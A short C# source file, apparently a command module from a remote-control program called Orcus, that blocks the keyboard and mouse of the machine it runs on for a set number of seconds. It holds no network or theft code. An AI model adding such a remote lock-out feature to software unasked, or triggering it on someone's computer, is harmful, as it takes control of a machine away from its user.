using System;
using System.Threading;
using Orcus.Native;

namespace Orcus.Commands.FunActions
{
    internal class BlockUserInput
    {
        public static void Block(int seconds)
        {
            NativeMethods.BlockInput(true);
            try
            {
                Thread.Sleep(TimeSpan.FromSeconds(seconds));
            }
            catch
            {
                // ignored
            }
            finally
            {
                NativeMethods.BlockInput(false);
            }
        }
    }
}